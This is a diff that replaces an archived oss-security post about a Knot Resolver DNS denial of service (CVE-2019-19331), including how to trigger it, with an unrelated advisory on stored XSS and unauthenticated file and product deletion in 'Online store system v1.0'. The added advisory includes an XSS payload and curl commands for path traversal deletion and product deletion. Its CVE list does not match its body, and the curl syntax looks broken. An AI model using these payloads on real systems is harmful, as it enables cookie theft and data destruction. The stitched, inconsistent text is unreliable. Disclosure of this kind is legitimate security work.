@@ -1,75 +1,40 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/12/04/4
-Message-ID: <044b3d2b-7c9e-4854-c1c5-870181059873@nic.cz>
-Date: Wed, 4 Dec 2019 17:48:33 +0100
-From: Vladimír Čunát <vladimir.cunat@....cz>
-To: oss-security@...ts.openwall.com, knot-resolver-announce@...ts.nic.cz
-Subject: [CVE-2019-19331] Knot Resolver 4.3.0 security release
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2019/10/02/1
+Message-ID: <E37AAD4E-43F8-493A-AEEC-9FAE1A3D8E66@me.com>
+Date: Wed, 02 Oct 2019 06:42:19 -0400
+From: Akamai <larry0@...com>
+To: Open Security <oss-security@...ts.openwall.com>
+Subject: Multiple vulnerabilities in Online store system v1.0 Stored XSS and unauthenticated product deletions.
 Content-Type: text/plain; charset=utf-8
 
-Hello everyone,
-here are some details on the vulnerability (fix) disclosed today.
+Title: Multiple vulnerabilities in Online store system v1.0 Stored XSS and unauthenticated product deletions.
+Author: Larry W. Cashdollar @_larry0
+Date: 2019-09-18
+CVE-IDs: CVE-2019-8288 CVE-2019-8289 CVE-2019-8290 CVE-2019-8291
+Download Site: https://www.abcprintf.com/view_download.php?id=17
+Vendor: adcprintf
+Vendor Notified: 2019-09-18
+Vendor Contact: abcprintf@...il.com
+Advisory: http://www.vapidlabs.com/advisory.php?v=210
+Description: "Online store system" is a drop in customizable electronic store front. It has an administrative interface allowing user and product management. 
+Vulnerability:
+The application contains stored XSS vulnerabilities throughout the form page user_view.php  as none of the variables are sanitized before being presented back to the client. This can be exploited by a new user injecting cookie stealing code into their login information form and waiting for an administrative user to navigate to the users panel. 
 
-Impact
-======
-Some DNS packets might take even a few seconds to process with full CPU utilization, allowing DoS.
-
-Unembargo date
-==============
-Wednesday 4th December 2019, afternoon GMT
-
-Fixes
-=====
-Most of the issue can be mitigated by updating libknot dependency to >= 2.9.1.
-
-Otherwise a complete fix was released in Knot Resolver 4.3.0, which also does not require libknot update.
-The attached patches are applicable to recent releases (when doc diff is stripped).
-
-
-[Affected version (required)]:
-Knot Resolver <= 4.2.2
-
-[Fixed version (optional)]:
-Knot Resolver 4.3.0
-
-[Vulnerability type]:
-CWE-407: Inefficient Algorithmic Complexity
-
-[Impact of exploitation]:
-Denial of service through high CPU utilization.
-
-[Description of vulnerability]:
-DNS replies with very many resource records might be processed very inefficiently, in extreme cases taking even several CPU seconds for each such uncached message.  For example, a few thousand A records can be squashed into one DNS message (limit is 64kB).
-
-To execute an attack it is enough to:
-+ own a rogue authoritative server or utilize an existing name with a huge RRset, and
-+ trigger DNS query for that name from the resolver to be attacked
+CVE-2019-8288 
+159  echo '<td>'.$row['adidas_member_user'].'</td>'; 
+CVE-2019-8289 
+160 echo '<td>'. $row['adidas_member_email'] . '</td>';
+ CVE-2019-8290 The registration form requirements for the member email format can be bypassed by posting directly to sent_register.php allowing special characters to be included and an XSS payload to be injected. 
+CVE-2019-8291 The code in delete_file.php doesn't check to see if a user has administrative rights nor does it check for path traversal allowing a '..' to delete arbitrary files owned by the httpd process. 
+CVE-2019-8292 The code in delete_product.php doesn't check to see if a user has administrative rights before allowing them to delete a product from the database.
+Exploit Code:
+1. Set login name or email to "><script>alert(1);</script>
+2. $ curl -s cookie.txt -X POST -d "username=jsmith&password=jsmith123&email=\"><script>alert(1);</script>%40email.com" http://example.com/pso/sent_register.php
+3.  
+4.  
+5. $ curl -s cookie.txt "http://example.com/pso/admin/delete_file.php?id=0&filename=../women.php"
+6.  
+7. $ curl -s cookie.txt http://example.com/pso/admin/product_delete.php?id=4
 
 
-Attack Vector (AV): Network
-Attack Complexity (AC): Low
-Privileges Required (PR): None
-User Interaction (UI): None
-Scope (S): Unchanged
-Confidentiality (C): None
-Integrity (I): None
-Availability (A): High
 
-Technical Details:
-CWE-407
-
-[Reference URL]:
-https://gitlab.labs.nic.cz/knot/knot-resolver/tags/v4.3.0
-
---Vladimir
-
-
-Content of type "text/html" skipped
-
-View attachment "big-rrset.patch" of type "text/plain" (14902 bytes)
-
-View attachment "cname-limit.patch" of type "text/x-patch" (3377 bytes)
-
-View attachment "big-rrset-abort.patch" of type "text/x-patch" (1340 bytes)
-
-Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
